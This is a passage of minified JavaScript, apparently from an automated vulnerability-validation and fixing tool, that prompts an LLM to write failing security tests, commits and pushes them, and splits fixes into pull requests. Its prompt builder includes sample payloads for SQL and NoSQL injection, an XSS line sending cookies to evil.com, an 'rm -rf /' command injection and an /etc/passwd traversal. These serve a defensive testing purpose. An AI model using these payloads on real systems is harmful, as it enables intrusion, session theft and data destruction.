0,framework:H.generatedTests.framework,testFile:H.generatedTests.testFile};if(!K.vulnerableCommit.allPassed){if(U.info("✅ Vulnerability validated! RED tests failed as expected"),z)await this.storeValidationResultWithBranch(X,H,K,z),U.info(`Validation result stored with branch reference: ${z}`);else await this.storeValidationResult(X,H,K);return await this.addGitHubLabel(X,"rsolv:validated"),await this.storeTestExecutionInPhaseData(X,Z,!0,z||void 0),{issueId:X.number,validated:!0,branchName:z||void 0,redTests:H.generatedTests.testSuite,testResults:K,testExecutionResult:Z,timestamp:new Date().toISOString(),commitHash:this.getCurrentCommitHash()}}else if($){if(U.info("[TESTING MODE] Tests passed but proceeding anyway for known vulnerable repo"),z)await this.storeValidationResultWithBranch(X,H,K,z),U.info(`Test mode validation result stored with branch reference: ${z}`);else await this.storeValidationResult(X,H,K);return await this.storeTestExecutionInPhaseData(X,Z,!0,z||void 0),{issueId:X.number,validated:!0,branchName:z||void 0,redTests:H.generatedTests.testSuite,testResults:K,testExecutionResult:Z,testingMode:!0,testingModeNote:"Tests passed but proceeding due to RSOLV_TESTING_MODE",timestamp:new Date().toISOString(),commitHash:this.getCurrentCommitHash()}}else return U.info("Tests passed on vulnerable code - marking as false positive"),this.addToFalsePositiveCache(X),await this.addGitHubLabel(X,"rsolv:false-positive"),await this.storeTestExecutionInPhaseData(X,Z,!1,z||void 0),{issueId:X.number,validated:!1,falsePositiveReason:"Tests passed on allegedly vulnerable code",testResults:K,testExecutionResult:Z,timestamp:new Date().toISOString(),commitHash:this.getCurrentCommitHash()}}catch(Y){return U.error(`Validation failed for issue #${X.number}:`,Y),{issueId:X.number,validated:!1,falsePositiveReason:`Validation error: ${Y}`,timestamp:new Date().toISOString(),commitHash:this.getCurrentCommitHash()}}}async validateBatch(X){U.info(`[VALIDATION MODE] Validating batch of ${X.length} issues`);let J=[];for(let W of X){let G=await this.validateVulnerability(W);if(J.push(G),X.indexOf(W)<X.length-1)await new Promise((H)=>setTimeout(H,2000))}let Q=J.filter((W)=>W.validated).length,Y=J.filter((W)=>!W.validated).length;return U.info("[VALIDATION MODE] Batch complete:"),U.info(`  - Validated: ${Q}`),U.info(`  - False positives: ${Y}`),J}async generateRedTests(X,J){let Q={provider:"anthropic",apiKey:this.config.aiProvider.apiKey,model:this.config.aiProvider.model,temperature:0.2,maxTokens:this.config.aiProvider.maxTokens,useVendedCredentials:this.config.aiProvider.useVendedCredentials},Y=new h6(Q),W=new Map;if(J.filesToModify&&J.filesToModify.length>0)for(let G of J.filesToModify)try{let H=q0.resolve(this.repoPath,G);if(A0.existsSync(H)){let z=A0.readFileSync(H,"utf8");W.set(G,z),U.debug(`Added file for test generation: ${G}`)}}catch(H){U.warn(`Could not read file ${G}:`,H)}return await Y.analyzeWithTestGeneration(X,this.config,W)}async createValidationBranch(X){let J=`rsolv/validate/issue-${X.number}`;try{return S0(`git checkout -b ${J}`,{cwd:this.repoPath}),U.info(`Created validation branch: ${J}`),J}catch(Q){throw U.error(`Failed to create validation branch ${J}:`,Q),Q}}async forceCommitTestsInTestMode(X,J,Q){let Y=q0.join(this.repoPath,".rsolv","tests");try{A0.mkdirSync(Y,{recursive:!0});let W=typeof X==="string"?X:JSON.stringify(X,null,2),G=q0.join(Y,"validation.test.js");A0.writeFileSync(G,W,"utf8");try{S0(`git checkout ${J} 2>/dev/null || git checkout -b ${J}`,{cwd:this.repoPath,stdio:"pipe"})}catch{U.debug("Branch checkout failed, continuing with current branch")}try{S0('git config user.email "rsolv-validation@rsolv.dev"',{cwd:this.repoPath,stdio:"pipe"}),S0('git config user.name "RSOLV Validation Bot"',{cwd:this.repoPath,stdio:"pipe"})}catch{}S0("git add .rsolv/tests/",{cwd:this.repoPath}),S0(`git commit -m "Test mode: Add validation tests for issue #${Q.number}" || true`,{cwd:this.repoPath,stdio:"pipe"});try{let H=process.env.GITHUB_TOKEN||process.env.GH_PAT;if(H&&process.env.GITHUB_REPOSITORY){let[z,$]=process.env.GITHUB_REPOSITORY.split("/"),V=`https://x-access-token:${H}@github.com/${z}/${$}.git`;S0(`git remote set-url origin ${V} 2>/dev/null || true`,{cwd:this.repoPath,stdio:"pipe"})}S0(`git push -f origin ${J} 2>/dev/null || true`,{cwd:this.repoPath,stdio:"pipe"})}catch{U.debug("Push failed in test mode, but tests are committed locally")}}catch(W){throw U.error(`Force commit in test mode failed: ${W}`),W}}async commitTestsToBranch(X,J,Q){try{let Y,W;if(this.config.rsolvApiKey&&process.env.RSOLV_API_URL)try{let H=await this.integrateTestsWithBackendRetry(X,Q);Y=H.targetFile,W=H.content,U.info(`✅ Backend integration succeeded: ${Y}`)}catch(H){throw U.error(`Backend integration failed after retries: ${H}`),Error(`Cannot commit tests: backend unavailable. ${H}`)}else{U.info("Backend not configured (Phase 3 pending), using .rsolv/tests/");let H=q0.join(this.repoPath,".rsolv","tests");if(A0.mkdirSync(H,{recursive:!0}),typeof X==="string")W=X;else if(X&&typeof X==="object")W=JSON.stringify(X,null,2);else W=`// Validation test
describe('Vulnerability Test', () => {
  it('validates vulnerability', () => {
    // ${X}
  });
});
`;Y=q0.join(H,"validation.test.js"),A0.writeFileSync(Y,W,"utf8")}S0('git config user.email "rsolv-validation@rsolv.dev"',{cwd:this.repoPath}),S0('git config user.name "RSOLV Validation Bot"',{cwd:this.repoPath});let G=q0.dirname(Y);S0(`git add ${G}`,{cwd:this.repoPath}),S0('git commit -m "Add validation tests for issue"',{cwd:this.repoPath}),U.info(`Committed tests to branch ${J} (target: ${Y})`);try{let H=process.env.GITHUB_TOKEN||process.env.GH_PAT;if(H&&process.env.GITHUB_REPOSITORY){let[z,$]=process.env.GITHUB_REPOSITORY.split("/"),V=`https://x-access-token:${H}@github.com/${z}/${$}.git`;try{S0(`git remote set-url origin ${V}`,{cwd:this.repoPath})}catch(K){U.debug("Could not configure authenticated remote")}}S0(`git push -f origin ${J}`,{cwd:this.repoPath}),U.info(`Pushed validation branch ${J} to remote`)}catch(H){U.warn(`Could not push validation branch to remote: ${H}`)}}catch(Y){throw U.error(`Failed to commit tests to branch ${J}:`,Y),Y}}async integrateTestsWithBackendRetry(X,J){if(!this.testIntegrationClient)throw Error("TestIntegrationClient not initialized - check API key configuration");for(let W=1;W<=3;W++)try{U.debug(`Backend integration attempt ${W}/3...`);let G=await this.scanTestFiles();if(G.length===0)throw Error("No test files found in repository");let H=this.detectFrameworkFromFile(J?.file||""),z=await this.testIntegrationClient.analyze({vulnerableFile:J?.file||"unknown",vulnerabilityType:J?.title||"unknown",candidateTestFiles:G,framework:H});if(!z.recommendations||z.recommendations.length===0)throw Error("Backend returned no test file recommendations");let $=z.recommendations[0].path;U.info(`Backend recommended target file: ${$} (score: ${z.recommendations[0].score})`);let V=q0.join(this.repoPath,$);if(!A0.existsSync(V))throw Error(`Recommended target file does not exist: ${$}`);let K=A0.readFileSync(V,"utf8"),Z=this.formatTestSuite(X),q=this.detectLanguage($),B=await this.testIntegrationClient.generate({targetFileContent:K,testSuite:Z,framework:H,language:q});if(U.info(`Backend integration succeeded using ${B.method} method`),B.insertionPoint)U.debug(`Insertion point: line ${B.insertionPoint.line}, strategy: ${B.insertionPoint.strategy}`);return{targetFile:$,content:B.integratedContent}}catch(G){if(W===3)throw U.error("Backend integration failed after 3 attempts"),G;if(!this.isRetryableError(G))throw U.error(`Non-retryable error: ${G}`),G;let $=1000*Math.pow(2,W-1);U.warn(`Attempt ${W} failed (${G}), retrying in ${$}ms...`),await new Promise((V)=>setTimeout(V,$))}throw Error("Backend integration failed after all retry attempts")}isRetryableError(X){let J=String(X).toLowerCase(),Q=["timeout","econnrefused","enotfound","network","503","502","504","429"];if(["400","401","403","404","422"].some((W)=>J.includes(W)))return!1;if(Q.some((W)=>J.includes(W)))return!0;return!0}async storeValidationResultWithBranch(X,J,Q,Y){let W=q0.join(this.repoPath,".rsolv","validation");A0.mkdirSync(W,{recursive:!0});let G=q0.join(W,`issue-${X.number}.json`),H={issueId:X.number,issueTitle:X.title,branchName:Y,validated:!0,testResults:J,validationResult:Q,timestamp:new Date().toISOString(),commitHash:this.getCurrentCommitHash()};A0.writeFileSync(G,JSON.stringify(H,null,2)),U.info(`Validation result with branch stored at ${G}`)}async storeValidationResult(X,J,Q){let Y=q0.join(this.repoPath,".rsolv","validation");A0.mkdirSync(Y,{recursive:!0});let W=q0.join(Y,`issue-${X.number}.json`),G={issueId:X.number,issueTitle:X.title,validated:!0,testResults:J,validationResult:Q,timestamp:new Date().toISOString(),commitHash:this.getCurrentCommitHash()};A0.writeFileSync(W,JSON.stringify(G,null,2)),U.info(`Validation result stored at ${W}`)}loadFalsePositiveCache(){try{let X=q0.join(this.repoPath,".rsolv","false-positives.json");if(A0.existsSync(X))JSON.parse(A0.readFileSync(X,"utf8")).entries?.forEach((Q)=>{if(Q.expiresAt&&new Date(Q.expiresAt)<new Date)return;this.falsePositiveCache.add(Q.pattern)}),U.info(`Loaded ${this.falsePositiveCache.size} false positive patterns`)}catch(X){U.warn("Could not load false positive cache:",X)}}addToFalsePositiveCache(X){let J=this.getCacheKey(X);this.falsePositiveCache.add(J);let Q=q0.join(this.repoPath,".rsolv","false-positives.json"),Y=q0.dirname(Q);A0.mkdirSync(Y,{recursive:!0});let W=Array.from(this.falsePositiveCache).map((G)=>({pattern:G,timestamp:new Date().toISOString(),expiresAt:new Date(Date.now()+2592000000).toISOString()}));A0.writeFileSync(Q,JSON.stringify({entries:W,version:"1.0"},null,2)),U.info(`Added issue #${X.number} to false positive cache`)}getCacheKey(X){return`${X.repository}#${X.number}#${X.title}`}ensureCleanGitState(){try{if(S0("git status --porcelain",{encoding:"utf8"}).trim())throw Error("Repository has uncommitted changes")}catch(X){U.warn("Git state check failed:",X)}}getCurrentCommitHash(){try{return S0("git rev-parse HEAD",{encoding:"utf8"}).trim()}catch{return"unknown"}}async addGitHubLabel(X,J){try{await Z0(this.config).issues.addLabels({owner:X.repository.owner,repo:X.repository.name,issue_number:X.number,labels:[J]}),U.info(`Added label '${J}' to issue #${X.number}`)}catch(Q){U.warn(`Failed to add label '${J}' to issue #${X.number}:`,Q)}}async storeTestExecutionInPhaseData(X,J,Q,Y){if(!this.phaseDataClient){U.debug("PhaseDataClient not available, skipping phase data storage");return}try{await this.phaseDataClient.storePhaseResults("validate",{validate:{[X.number]:{validated:Q,branchName:Y,testPath:J.testFile,testExecutionResult:J,timestamp:new Date().toISOString()}}},{repo:X.repository.fullName,issueNumber:X.number,commitSha:this.getCurrentCommitHash()}),U.info(`Stored test execution results in PhaseDataClient for issue #${X.number}`)}catch(W){U.warn("Failed to store test execution in PhaseDataClient:",W)}}async generateTestWithRetry(X,J,Q=3){let Y=[],W=this.detectFrameworkFromPath(J.path);U.info(`Starting test generation with retry (max ${Q} attempts)`),U.info(`Vulnerability: ${X.type} at ${X.location}`),U.info(`Target test file: ${J.path}`);for(let G=1;G<=Q;G++){U.info(`Attempt ${G}/${Q}: Generating test...`);try{let H=await this.generateTestWithLLM(X,J,Y,W),z=q0.join(this.repoPath,".rsolv","temp");A0.mkdirSync(z,{recursive:!0});let $=this.getLanguageExtension(W.name),V=q0.join(z,`test_${Date.now()}${$}`);A0.writeFileSync(V,H.redTests[0].testCode,"utf8"),U.info(`Wrote test to temp file: ${V}`);try{await this.validateSyntax(V,W),U.info("✓ Syntax validation passed")}catch(K){U.warn(`✗ Syntax error on attempt ${G}:`,K),Y.push({attempt:G,error:"SyntaxError",errorMessage:K instanceof Error?K.message:String(K),timestamp:new Date().toISOString()});continue}try{let K=await this.runTest(V,W);if(K.passed){U.warn(`✗ Test passed unexpectedly on attempt ${G} (should fail on vulnerable code)`),Y.push({attempt:G,error:"TestPassedUnexpectedly",errorMessage:"Test passed when it should fail to demonstrate vulnerability",timestamp:new Date().toISOString()});continue}if(K.existingTestsFailed){U.warn(`✗ Existing tests failed on attempt ${G} (regression detected)`),Y.push({attempt:G,error:"ExistingTestsRegression",errorMessage:`Existing tests failed: ${K.failedTests?.join(", ")}`,timestamp:new Date().toISOString()});continue}return U.info(`✓ Test generation successful on attempt ${G}`),H}catch(K){U.error(`Error running test on attempt ${G}:`,K),Y.push({attempt:G,error:"TestExecutionError",errorMessage:K instanceof Error?K.message:String(K),timestamp:new Date().toISOString()});continue}}catch(H){U.error(`Error during test generation attempt ${G}:`,H),Y.push({attempt:G,error:"GenerationError",errorMessage:H instanceof Error?H.message:String(H),timestamp:new Date().toISOString()})}}return U.warn(`Failed to generate valid test after ${Q} attempts`),await this.tagIssueNotValidated(X,Y),null}async generateTestWithLLM(X,J,Q,Y){let W=this.buildLLMPrompt(X,J,Q,Y),G={provider:"anthropic",apiKey:this.config.aiProvider.apiKey,model:this.config.aiProvider.model,temperature:0.2,maxTokens:this.config.aiProvider.maxTokens,useVendedCredentials:this.config.aiProvider.useVendedCredentials},H=new h6(G),z={id:`vuln-${Date.now()}`,number:0,title:X.description,body:W,labels:[],assignees:[],repository:{owner:"test",name:"test",fullName:"test/test",defaultBranch:"main"},source:"github",createdAt:new Date().toISOString(),updatedAt:new Date().toISOString(),metadata:{}},$=new Map;$.set(J.path,J.content);let V=await H.analyzeWithTestGeneration(z,this.config,$);if(!V.generatedTests?.testSuite)throw Error("LLM failed to generate test suite");let K=V.generatedTests.testSuite.redTests||(V.generatedTests.testSuite.red?[V.generatedTests.testSuite.red]:[]);return{framework:Y.name,testFile:J.path,redTests:K}}buildLLMPrompt(X,J,Q,Y){let W=this.getRealisticVulnerabilityExample(X.type),G=`Generate a RED test for a security vulnerability.

VULNERABILITY: ${X.description}
TYPE: ${X.type}
LOCATION: ${X.location}
ATTACK VECTOR: ${X.attackVector}
${X.vulnerablePattern?`VULNERABLE PATTERN: ${X.vulnerablePattern}`:""}
${X.source?`SOURCE: ${X.source}`:""}

${W}

TARGET TEST FILE: ${J.path}
FRAMEWORK: ${Y.name}

TARGET FILE CONTENT (for context):
\`\`\`
${J.content}
\`\`\`

YOUR TASK:
Generate test code that:
1. Uses the attack vector: ${X.attackVector}
2. FAILS on vulnerable code (proves exploit works)
3. PASSES after fix is applied
4. Reuses existing setup blocks from target file
5. Follows ${Y.name} conventions`;if(Q.length>0){G+=`

PREVIOUS ATTEMPTS (learn from these errors):`;for(let z of Q)G+=`
- Attempt ${z.attempt}: ${z.error} - ${z.errorMessage}`;let H=Q[Q.length-1].error;if(H==="SyntaxError")G+=`

IMPORTANT: Fix the syntax error. Ensure valid ${Y.name} syntax.`;else if(H==="TestPassedUnexpectedly")G+=`

IMPORTANT: Make the test MORE AGGRESSIVE. It must FAIL on vulnerable code.`;else if(H==="ExistingTestsRegression")G+=`

IMPORTANT: Don't break existing tests. Avoid modifying shared state or setup blocks.`}return G}getRealisticVulnerabilityExample(X){return{sql_injection:`REAL-WORLD EXAMPLE (RailsGoat):
Pattern: User.where("id = '#{params[:user][:id]}'")
Attack: 5') OR admin = 't' --'
Impact: Privilege escalation to admin
CWE: CWE-89`,nosql_injection:`REAL-WORLD EXAMPLE (NodeGoat):
Pattern: db.accounts.find({username: username, password: password})
Attack: {"username": "admin", "password": {"$gt": ""}}
Impact: Authentication bypass
CWE: CWE-943`,xss:`REAL-WORLD EXAMPLE (NodeGoat):
Pattern: res.send(\`<h1>Profile: \${user.name}</h1>\`)
Attack: <script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
Impact: Session hijacking
CWE: CWE-79`,command_injection:`REAL-WORLD EXAMPLE:
Pattern: exec(\`tar -czf backup.tar.gz \${filename}\`)
Attack: data.txt; rm -rf / #
Impact: System compromise
CWE: CWE-78`,path_traversal:`REAL-WORLD EXAMPLE:
Pattern: res.sendFile(\`/app/uploads/\${filename}\`)
Attack: ../../../etc/passwd
Impact: Read sensitive files
CWE: CWE-22`}[X.toLowerCase()]||`Vulnerability type: ${X}`}detectFrameworkFromPath(X){let J=q0.basename(X),Q=q0.extname(X);if(J.includes(".spec.")){if(Q===".rb")return{name:"rspec",syntaxCheckCommand:"ruby -c",testCommand:"bundle exec rspec"};if(Q===".ts"||Q===".js")return{name:"jest",syntaxCheckCommand:"node --check",testCommand:"npm test"}}if(J.includes(".test.")){if(Q===".ts"||Q===".js")return{name:"vitest",syntaxCheckCommand:"node --check",testCommand:"npm test"};if(Q===".php")return{name:"phpunit",syntaxCheckCommand:"php -l",testCommand:"vendor/bin/phpunit"}}if(Q===".py")return{name:"pytest",syntaxCheckCommand:"python -m py_compile",testCommand:"pytest"};if(Q===".rb")return{name:"rspec",syntaxCheckCommand:"ruby -c",testCommand:"bundle exec rspec"};if(Q===".java")return{name:"junit5",syntaxCheckCommand:"javac",testCommand:"mvn test"};if(Q===".ex"||Q===".exs")return{name:"exunit",syntaxCheckCommand:"elixir -c",testCommand:"mix test"};return{name:"generic",syntaxCheckCommand:'echo "No syntax check"',testCommand:'echo "No test runner"'}}getLanguageExtension(X){return{rspec:".rb",minitest:".rb",pytest:".py",phpunit:".php",pest:".php",jest:".js",vitest:".ts",mocha:".js",junit5:".java",testng:".java",exunit:".exs"}[X.toLowerCase()]||".js"}async validateSyntax(X,J){if(!J.syntaxCheckCommand){U.debug("No syntax check command available");return}try{let Q=`${J.syntaxCheckCommand} ${X}`;S0(Q,{cwd:this.repoPath,encoding:"utf8"})}catch(Q){throw Error(`Syntax validation failed: ${Q.message}`)}}async runTest(X,J){if(!J.testCommand)return U.warn("No test command available, skipping test execution"),{passed:!1,existingTestsFailed:!1};try{let Q=`${J.testCommand} ${X}`,Y=S0(Q,{cwd:this.repoPath,encoding:"utf8"});return{passed:Y.includes("0 failures")||Y.includes("All tests passed"),existingTestsFailed:!1}}catch(Q){let Y=Q.stdout||Q.message||"",G=(Y.match(/failed/gi)||[]).length>1;return{passed:!1,existingTestsFailed:G,failedTests:G?this.extractFailedTestNames(Y):void 0}}}extractFailedTestNames(X){let J=[],Q=[/FAIL\s+(.+)/g,/✗\s+(.+)/g,/Failed:\s+(.+)/g,/\d+\)\s+(.+)/g];for(let Y of Q){let W=X.matchAll(Y);for(let G of W)if(G[1])J.push(G[1].trim())}return J.slice(0,5)}async tagIssueNotValidated(X,J){U.error(`Failed to validate vulnerability after ${J.length} attempts`),U.error(`Vulnerability: ${X.type} at ${X.location}`),U.error("Attempt history:");for(let Q of J)U.error(`  - Attempt ${Q.attempt}: ${Q.error} - ${Q.errorMessage}`)}async scanTestFiles(X){let J=[],Q=["**/*.spec.ts","**/*.spec.js","**/*.test.ts","**/*.test.js","**/*_spec.rb","**/*_test.py","**/*Test.java","**/*_test.exs"];for(let Y of Q)try{let W=S0(`find ${this.repoPath} -name "${Y.replace("**/","")}" -type f`,{encoding:"utf8",maxBuffer:10485760}).trim().split(`
`).filter(Boolean);J.push(...W)}catch(W){}return J}formatTestSuite(X){if(X.redTests&&Array.isArray(X.redTests))return X;if(X.red)return{redTests:[X.red]};if(X.testName&&X.testCode)return{redTests:[X]};return X}detectLanguage(X){let J=q0.extname(X).toLowerCase();return{".rb":"ruby",".js":"javascript",".ts":"typescript",".py":"python",".java":"java",".php":"php",".ex":"elixir",".exs":"elixir"}[J]||"javascript"}detectFrameworkFromFile(X){let J=q0.extname(X).toLowerCase();return{".rb":"rspec",".js":"vitest",".ts":"vitest",".py":"pytest",".java":"junit5",".php":"phpunit",".ex":"exunit",".exs":"exunit"}[J]||"vitest"}}var FQ=s(()=>{I1();AG();m4();c4();WJ();z9();hA()});var gA={};N0(gA,{parseIssueBody:()=>Dx1,enhanceValidationData:()=>wx1});function Dx1(X){let J={files:[]};if(!X||typeof X!=="string")return U.warn("[IssueBodyParser] Invalid issue body provided"),J;let Q=X.match(/\*\*Type\*\*:\s*(\S+)/);if(Q)J.type=Q[1];let Y=X.match(/\*\*Severity\*\*:\s*(\S+)/);if(Y)J.severity=Y[1];let W=/####\s*`([^`]+)`/g,G=X.split(`
`),H=null,z=!1;for(let $=0;$<G.length;$++){let V=G[$],K=V.match(/####\s*`([^`]+)`/);if(K){if(H)J.files.push(H);H={path:K[1],vulnerabilities:[]},z=!0;continue}if(z&&H&&V.trim().startsWith("-")){let Z=V.match(/-\s*\*\*Line\s+(\d+)\*\*:\s*(.+)/);if(Z)H.vulnerabilities.push({line:parseInt(Z[1],10),message:Z[2].trim()})}if(V.startsWith("###")&&!V.includes("Affected Files")){if(z=!1,H)J.files.push(H),H=null}}if(H)J.files.push(H);return U.debug("[IssueBodyParser] Parsed issue body:",{type:J.type,severity:J.severity,filesCount:J.files.length,files:J.files.map(($)=>({path:$.path,vulnerabilitiesCount:$.vulnerabilities.length}))}),J}function wx1(X,J){let Q={...X,vulnerabilities:[...X.vulnerabilities||[]]},Y=new Map;return J.files.forEach((W)=>{W.vulnerabilities.forEach((G)=>{if(!Y.has(G.line))Y.set(G.line,W.path);else U.debug("[IssueBodyParser] Line number collision detected:",{line:G.line,existingFile:Y.get(G.line),newFile:W.path})})}),Q.vulnerabilities=Q.vulnerabilities.map((W)=>{if(W.file==="unknown.js"&&W.line&&Y.has(W.line)){let G=Y.get(W.line);return U.debug(`[IssueBodyParser] Replacing unknown.js with ${G} for line ${W.line}`),{...W,file:G,type:W.type==="UNKNOWN"&&J.type?J.type:W.type}}return W}),U.info("[IssueBodyParser] Enhanced validation data:",{originalCount:X.vulnerabilities?.length||0,enhancedCount:Q.vulnerabilities.length,filesFixed:Q.vulnerabilities.filter((W)=>W.file!=="unknown.js"&&X.vulnerabilities?.some((G)=>G.file==="unknown.js"&&G.line===W.line)).length}),Q}var mA=s(()=>{I1()});var qJ,wG=10,NG=100,Nx1=7500;var t7=s(()=>{LG();((W)=>{W.SIMPLE="simple";W.MODERATE="moderate";W.COMPLEX="complex";W.MANUAL="manual"})(qJ||={})});class uA{name="module_grouping";async group(X){let J=new Map;for(let Q of X){let Y=Q.path.split("/"),W=Y.length>1?Y[0]:"root";if(!J.has(W))J.set(W,[]);J.get(W).push(Q)}return Array.from(J.values())}}class cA{name="severity_based";async group(X){let J=["CRITICAL","HIGH","MEDIUM","LOW"],Q=new Map;J.forEach((Y)=>Q.set(Y,[]));for(let Y of X)Q.get(Y.severity).push(Y);return J.map((Y)=>Q.get(Y)).filter((Y)=>Y.length>0)}}class lA{name="dependency_analysis";async group(X){let J=[],Q=new Set;for(let W of X){if(Q.has(W.path))continue;let G=[W];if(Q.add(W.path),W.imports)for(let H of W.imports){let z=X.find(($)=>$.path===H||$.path===H+".js"||$.path===H.replace("./","")+".js"||$.path===H.replace("./",""));if(z&&!Q.has(z.path))G.push(z),Q.add(z.path)}for(let H of X){if(Q.has(H.path))continue;if(H.imports?.some((z)=>W.path.includes(z.replace("./",""))||W.path===z+".js"))G.push(H),Q.add(H.path)}J.push(G)}let Y=X.filter((W)=>!Q.has(W.path));if(Y.length>0)J.push(Y);return J}}class BJ{config;strategies;constructor(X){this.config=X;this.strategies=new Map,this.strategies.set("module_grouping",new uA),this.strategies.set("severity_based",new cA),this.strategies.set("dependency_analysis",new lA)}async chunkVulnerability(X){let{files:J}=X,Q=[],Y=await this.groupFilesByStrategy(J),W=0;for(let G of Y){let H=[],z=0;for(let $ of G){let V=this.estimateTokens([$]),K=H.length>=this.config.maxFilesPerChunk,Z=z+V>this.config.maxContextTokens;if(H.length>0&&(K||Z))Q.push({index:W++,files:H,estimatedTokens:z,vulnerabilityType:X.type}),H=[],z=0;H.push($),z+=V}if(H.length>0)Q.push({index:W++,files:H,estimatedTokens:z,vulnerabilityType:X.type})}return Q}getStrategy(X){let J=this.strategies.get(X);if(!J)throw Error(`Strategy ${X} not found`);return J}async groupFilesByStrategy(X){if(!this.config.strategies||this.config.strategies.length===0)return[X];let J=this.config.strategies;for(let Q of J){let Y=this.strategies.get(Q);if(Y){let W=await Y.group(X);if(W.length>0)return W}}return[X]}estimateTokens(X){return X.reduce((J,Q)=>{let Y=Q.lines.length*wG;return J+Y+NG},0)}}var LG=s(()=>{t7()});class e7{prNumbers=new Map;nextPrNumber=1000;async generatePRSeries(X,J){let Q=[],Y=X.length;for(let W=0;W<X.length;W++){let G=X[W],H=W+1,z={number:this.nextPrNumber++,title:`[RSOLV] Fix ${G.vulnerabilityType} (${H}/${Y})`,branch:`rsolv/fix-${J}-chunk-${H}`,files:G.files,body:this.generatePRBody(G,H,Y,J,Q),dependencies:W>0?[Q[W-1].number]:void 0};Q.push(z),this.prNumbers.set(`${J}-${H}`,z.number)}return Q}generatePRBody(X,J,Q,Y,W){let G=[];if(G.push(`## \uD83D\uDD27 Automated Fix - Part ${J} of ${Q}`),G.push(""),G.push(`Fixes part of #${Y}`),G.push(""),W.length>0){G.push("### Dependencies");let H=W[W.length-1];G.push(`Depends on #${H.number}`),G.push("")}G.push("### Files Modified");for(let H of X.files)G.push(`- \`${H.path}\` (${H.severity} severity)`);if(G.push(""),G.push("### Vulnerability Type"),G.push(`**${X.vulnerabilityType}**`),G.push(""),X.estimatedTokens)G.push("### Context Size"),G.push(`Estimated tokens: ${X.estimatedTokens}`),G.push("");if(Q>1)G.push("### PR Series"),G.push(`This is part ${J} of a ${Q}-part fix series.`),G.push("Please review and merge PRs in order."),G.push("");return G.push("---"),G.push("*Generated by RSOLV with multi-file chunking strategy*"),G.join(`
`)}async delay(X){return new Promise((J)=>setTimeout(J,X))}}class MJ{analyze(X){let J=this.calculateFactors(X);return this.determineComplexity(J)}calculateFactors(X){return{fileCount:X.files?.length||1,requiresConfigChange:X.requiresConfigChange||!1,requiresNewDependencies:X.requiresNewDependencies||!1,crossFileReferences:this.countCrossReferences(X),testImpact:this.assessTestImpact(X)}}determineComplexity(X){if(X.fileCount>=10||X.requiresConfigChange&&X.requiresNewDependencies)return"complex";if(X.requiresConfigChange&&X.crossFileReferences>5)return"manual";if(X.fileCount>=3&&X.fileCount<10)return"moderate";return"simple"}countCrossReferences(X){if(!X.files)return 0;let J=0;for(let Q of X.files)if(Q.imports)J+=Q.imports.length;return J}assessTestImpact(X){if(!X.files)return 0;return X.files.filter((Q)=>Q.path.includes("test")||Q.path.includes("spec")).length}}class IG{analyzer=new MJ;async route(X){let J=this.analyzer.analyze(X);if(J==="complex"||J==="manual")return{approach:"manual_guide",guide:await this.generateManualGuide(X,J)};return{approach:"automated",complexity:J}}async generateManualGuide(X,J){let Q=[];if(X.requiresConfigChange)Q.push("1. Update configuration files"),Q.push("2. Set environment variables");if(X.requiresNewDependencies)Q.push("3. Install required dependencies"),Q.push("4. Update package.json");return Q.push("5. Review and test changes"),Q.push("6. Validate security improvements"),{steps:Q.length,content:Q.join(`
`),complexity:J,reason:`This ${X.type} vulnerability requires manual intervention due to its complexity`}}}var pA=s(()=>{t7();t7()});class CG{async handle(X){let J=this.identifySecretType(X),Q=this.determineReplacement(J,X),Y=this.generateCodeFix(X,Q),W=this.generateSetupGuide(X,Q);return{success:!0,codeFix:Y,setupGuide:W,instructions:W,pr:{title:`[RSOLV] Remove hardcoded ${J}`,body:`Replaces hardcoded ${J} with environment variable`,branch:`rsolv/fix-hardcoded-${J}`,files:[{path:X.file,lines:[X.line],severity:"CRITICAL"}]},validationSteps:[`Ensure ${Q.envVar} is set in your environment`,"Test the application with the new configuration","Verify the secret is no longer visible in the code"]}}identifySecretType(X){if(X.secretType)return X.secretType.replace("_"," ");let J=X.secret.toLowerCase();if(J.includes("api")||J.includes("key"))return"api key";if(J.includes("password")||J.includes("pwd"))return"password";if(J.includes("token"))return"token";if(J.includes("cert"))return"certificate";return"secret"}determineReplacement(X,J){let Q=this.generateEnvVarName(X,J);return{envVar:Q,accessor:`process.env.${Q}`,configSection:J.context||"configuration"}}generateEnvVarName(X,J){if(J.context==="database_connection")return"DATABASE_PASSWORD";if(X==="api key")return"API_KEY";return X.toUpperCase().replace(/\s+/g,"_")}generateCodeFix(X,J){let Q=[],Y=X.secret.match(/(\w+)\s*[=:]\s*["']([^"']+)["']/);if(Y){let[,W,G]=Y;if(X.secret.includes("="))Q.push(`${W} = ${J.accessor}`);else if(X.secret.includes(":"))Q.push(`${W}: ${J.accessor}`)}else Q.push(J.accessor);return Q.join(`
`)}generateSetupGuide(X,J){let Q=[];Q.push("## Setup Instructions"),Q.push(""),Q.push("Set the following environment variable:"),Q.push(""),Q.push("```bash");let Y=X.secret.match(/["']([^"']+)["']/),W=Y?Y[1]:"<your-secret-value>";if(Q.push(`export ${J.envVar}="${W}"`),Q.push("```"),Q.push(""),Q.push("Or add to your `.env` file:"),Q.push("```"),Q.push(`${J.envVar}=${W}`),Q.push("```"),Q.push(""),X.context==="database_connection")Q.push("### Database Configuration"),Q.push("Make sure your database connection uses the environment variable."),Q.push("");return Q.push("### Security Note"),Q.push("Never commit secrets to version control. Use environment variables or a secure secret management system."),Q.join(`
`)}}var iA={};N0(iA,{VulnerabilityChunker:()=>BJ,TOKENS_PER_LINE:()=>wG,TOKENS_PER_FILE_OVERHEAD:()=>NG,MultiPRGenerator:()=>e7,MAX_SAFE_TOKENS:()=>Nx1,HardcodedSecretsHandler:()=>CG,FixComplexity:()=>qJ,ComplexityRouter:()=>IG,ComplexityAnalyzer:()=>MJ,ChunkingIntegration:()=>dA});class dA{chunker;prGenerator;complexityAnalyzer;constructor(X){let J={enabled:!0,maxFilesPerChunk:3,maxLinesPerChunk:500,maxContextTokens:8000,multiPR:{enabled:!0,delayBetweenPRs:2000}};this.chunker=new BJ(X||J),this.prGenerator=new e7,this.complexityAnalyzer=new MJ}shouldChunk(X){return(X.files?.length||X.filesToModify?.length||1)>3||X.requiresChunking===!0||this.isComplexVulnerability(X)}isComplexVulnerability(X){let J=this.complexityAnalyzer.analyze(X);return J==="complex"||J==="manual"}async processWithChunking(X,J){console.log(`[ChunkingIntegration] Processing ${X.type} with chunking`);let Q=this.convertToMultiFile(X,J),Y=this.complexityAnalyzer.analyze(Q);if(console.log(`[ChunkingIntegration] Complexity: 